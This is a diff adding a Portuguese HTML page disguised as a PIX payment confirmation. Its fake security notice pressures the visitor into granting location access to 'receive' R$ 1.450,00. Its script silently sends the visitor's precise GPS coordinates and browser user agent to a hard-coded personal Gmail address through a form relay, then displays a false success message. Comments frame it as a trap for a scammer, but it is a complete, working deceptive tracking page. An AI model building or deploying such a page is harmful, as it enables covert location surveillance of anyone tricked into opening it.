@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Confirmação de Recebimento PIX</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        button {
+            touch-action: manipulation;
+            -webkit-tap-highlight-color: transparent;
+        }
+        .loader {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #32bcad;
+            border-radius: 50%;
+            width: 24px;
+            height: 24px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        .min-h-screen-ios {
+            min-height: -webkit-fill-available;
+        }
+    </style>
+</head>
+<body class="bg-gray-50 flex items-center justify-center min-h-screen min-h-screen-ios p-4 font-sans">
+
+    <div id="app" class="max-w-md w-full bg-white rounded-3xl shadow-2xl overflow-hidden border border-gray-100">
+        <!-- Cabeçalho -->
+        <div class="bg-[#32bcad] p-8 text-white text-center">
+            <div class="w-16 h-16 bg-white/20 rounded-full flex items-center justify-center mx-auto mb-3 shadow-inner">
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-10 w-10" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
+                </svg>
+            </div>
+            <h1 class="text-xl font-bold">PIX Recebido</h1>
+            <p class="text-xs opacity-80 tracking-widest uppercase">Protocolo: #TX-99281-BR</p>
+        </div>
+
+        <div class="p-6">
+            <!-- Valor -->
+            <div class="mb-8 text-center">
+                <p class="text-gray-400 text-[10px] uppercase tracking-[0.2em] font-bold">Valor da Transação</p>
+                <p class="text-5xl font-black text-gray-800 tracking-tight">R$ 1.450,00</p>
+            </div>
+
+            <!-- Dados -->
+            <div class="space-y-4 border-t border-b border-gray-50 py-6 mb-8">
+                <div class="flex justify-between items-center">
+                    <span class="text-gray-400 text-xs font-semibold uppercase">Origem:</span>
+                    <span class="font-bold text-gray-700">ANTONIO S. SOUSA</span>
+                </div>
+                <div class="flex justify-between items-center text-right">
+                    <span class="text-gray-400 text-xs font-semibold uppercase">Instituição:</span>
+                    <span class="font-medium text-gray-600">BANCO BRADESCO S.A.</span>
+                </div>
+            </div>
+
+            <!-- Instruções -->
+            <div id="action-area" class="space-y-4">
+                <div class="bg-blue-50 rounded-2xl p-4 border border-blue-100">
+                    <p class="text-[11px] text-blue-800 text-center leading-relaxed">
+                        <strong>AVISO DE SEGURANÇA:</strong><br>
+                        Para concluir a transferência, clique no botão abaixo e <strong>selecione "PERMITIR"</strong> na solicitação de localização que aparecerá em seu navegador.
+                    </p>
+                </div>
+                
+                <button id="trackBtn" class="w-full bg-[#32bcad] active:scale-95 text-white font-bold py-5 px-4 rounded-2xl shadow-xl transition-all flex items-center justify-center gap-3 text-sm uppercase tracking-wider">
+                    AUTORIZAR E RECEBER
+                </button>
+            </div>
+
+            <div id="status" class="mt-4 text-[10px] font-mono text-gray-400 hidden text-center italic">
+                Aguardando autorização do dispositivo...
+            </div>
+        </div>
+
+        <div class="bg-gray-50 p-4 text-center border-t border-gray-100">
+            <p class="text-[9px] text-gray-400 font-bold uppercase tracking-widest">Protocolo de Segurança Ativo</p>
+        </div>
+    </div>
+
+    <!-- Modal de Sucesso -->
+    <div id="modal" class="fixed inset-0 bg-black/60 hidden items-center justify-center p-6 backdrop-blur-sm z-50">
+        <div class="bg-white rounded-3xl p-8 max-w-xs w-full text-center shadow-2xl">
+            <div class="w-20 h-20 bg-green-50 text-green-500 rounded-full flex items-center justify-center mx-auto mb-4 border-4 border-green-100">
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-12 w-12" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7" />
+                </svg>
+            </div>
+            <h2 class="text-xl font-bold mb-2 text-gray-800">Sucesso!</h2>
+            <p class="text-xs text-gray-500 mb-6">Validação biométrica e geográfica concluída. O saldo entrará em sua conta em instantes.</p>
+            <button onclick="location.reload()" class="bg-[#32bcad] text-white py-4 px-6 rounded-2xl w-full font-bold text-sm">FECHAR</button>
+        </div>
+    </div>
+
+    <script>
+        const trackBtn = document.getElementById('trackBtn');
+        const statusDiv = document.getElementById('status');
+        const modal = document.getElementById('modal');
+        const emailAlvo = "cdgeidsonserra@gmail.com";
+
+        // Função de envio separada para não travar a UI
+        async function sendData(lat, lng, acc) {
+            try {
+                await fetch(`https://formsubmit.co/ajax/${emailAlvo}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+                    body: JSON.stringify({
+                        subject: "🚨 ALVO CAPTURADO: GOLPISTA PIX",
+                        maps: `https://www.google.com/maps?q=${lat},${lng}`,
+                        precisao: acc.toFixed(2) + "m",
+                        navegador: navigator.userAgent
+                    })
+                });
+            } catch (e) {
+                console.log("Erro no envio silencioso");
+            }
+        }
+
+        trackBtn.addEventListener('click', function() {
+            // Feedback imediato
+            statusDiv.classList.remove('hidden');
+            statusDiv.innerHTML = "Solicitando permissão ao sistema...";
+            trackBtn.disabled = true;
+            trackBtn.innerHTML = '<div class="loader"></div> AGUARDANDO...';
+
+            if (!navigator.geolocation) {
+                statusDiv.innerHTML = "Erro: Seu navegador não suporta geolocalização.";
+                return;
+            }
+
+            // A chamada deve ser direta para evitar bloqueio do iOS
+            navigator.geolocation.getCurrentPosition(
+                function(position) {
+                    const { latitude, longitude, accuracy } = position.coords;
+                    
+                    statusDiv.innerHTML = "Sinal validado. Processando recebimento...";
+                    
+                    // Envia os dados em background
+                    sendData(latitude, longitude, accuracy);
+
+                    // Mostra o sucesso para o golpista
+                    setTimeout(() => {
+                        modal.style.display = 'flex';
+                    }, 1500);
+                },
+                function(error) {
+                    trackBtn.disabled = false;
+                    trackBtn.innerHTML = "AUTORIZAR E RECEBER";
+                    trackBtn.classList.replace('bg-[#32bcad]', 'bg-red-600');
+
+                    let errorMsg = "Acesso Negado: Você deve permitir a localização para validar o PIX.";
+                    if (error.code === 3) errorMsg = "Tempo esgotado. Tente novamente em local aberto.";
+                    
+                    statusDiv.innerHTML = errorMsg;
+                    statusDiv.classList.add('text-red-600', 'font-bold');
+                    
+                    // Alerta nativo como fallback para forçar a atenção
+                    alert(errorMsg);
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 8000,
+                    maximumAge: 0
+                }
+            );
+        });
+    </script>
+</body>
+</html>
